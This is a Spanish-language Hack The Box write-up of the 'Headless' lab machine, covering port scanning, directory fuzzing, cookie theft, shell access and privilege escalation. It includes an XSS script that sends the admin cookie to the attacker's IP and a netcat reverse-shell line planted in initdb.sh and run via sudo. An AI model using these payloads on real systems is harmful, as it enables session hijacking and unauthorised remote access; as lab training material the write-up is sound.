---
title: Headless Writeup
description: 
date: 2024-08-27 00:00:00+0000
image: featured1.png
categories:
  - HackTheBox
  - easy HTB
tags: ["easy HTB"]
weight: 1       # You can add weight to some posts to override the default sorting (date descending)
---

### nmap

realizamos un escaneo con Nmap y encontramos estos puertos abiertos 

<img src="featured2.png" alt="Featured Image">


--- 

#### web

accedemos al sitio web 

> no encontramos nada, vamos hacer fuzzing a la web

<img src="featured3.png" alt="Featured Image">

---

#### fuzzing

realizamos un escaneo con gobuster, usamos el comando 

```
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/common.txt

```
encontramos el dominio /support

<img src="featured4.png" alt="Featured Image">

---

#### burpsuite


rellenamos el campo con cualquier informacion

>vamos interceptar las peticiones con **Burpsuite** 

<img src="featured5.png" alt="Featured Image">

---


esta es la peticion con **Burpsuite** 

<img src="featured6.png" alt="Featured Image">


---


en otra terminal los colocamos en escucha 

```
python3 -m http.server 80

```

<img src="featured7.png" alt="Featured Image">


--- 

#### script


vamos a robarnos las cookies de Administrador 

utilizando este script

```
<script>var i=new Image(); i.src="http://<tu ip> :8001/?cookie="+btoa(document.cookie);</script>

```

<img src="featured8.png" alt="Featured Image">


---


lo colocamos de esta manera el script que previamente creamos 

<img src="featured9.png" alt="Featured Image">


---


#### base64

vamos al servidor que nos colocamos en escucha y conseguimos la cookie de sesion 
pero la cookie esta en base64 vamos a descodearla 

<img src="featured10.png" alt="Featured Image">


---

#### cookie 


usamos este comando 

```
echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d 

```
la conseguimos 

<img src="featured11.png" alt="Featured Image">


---



vamos a la pagina y inspeccionamos nos dirigimos a **storage** luego a **cookies** y la colocamos,

> recuerden refrescar la pagina 


<img src="featured12.png" alt="Featured Image">


---

al momento de recargar nos dara acceso al dashboard

<img src="featured14.png" alt="Featured Image">


---

#### payload

creamos un payload 

<img src="featured13.png" alt="Featured Image">


---


interceptamos la peticion a la web 

> colocaremos el payload 

> antes de mandar la peticion por Burpsuite recordemos colocarnos en escucha 


<img src="featured16.png" alt="Featured Image">



<img src="featured15.png" alt="Featured Image">

---

#### Burpsuite

mandamos la peticion con Burpsuite y conseguimos una shell


<img src="featured17.png" alt="Featured Image">

---



flag de user conseguida 

<img src="featured18.png" alt="Featured Image">
---


vamos utilizar el comando sudo -l para verificar el uso de permisos en el usuario en el cual nos encontramos 
```
sudo -l 

```
nos fijamos que podemos usar 

> /usr/bin/syscheck

<img src="featured19.png" alt="Featured Image">


---

#### abuso de archivo

hacemos cat a la ruta 

Vemos que el archivo initdb.sh se está lanzando, por lo que lo que podemos hacer es poner una carga útil en ese archivo

<img src="featured20.png" alt="Featured Image">

---

```
echo "nc -e /bin/sh 10.10.14.132 1212" > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck

```

<img src="featured21.png" alt="Featured Image">

---

#### shell 

en otra terminal nos colocamos en escucha y listo conseguimos la shell 


<img src="featured22.png" alt="Featured Image">

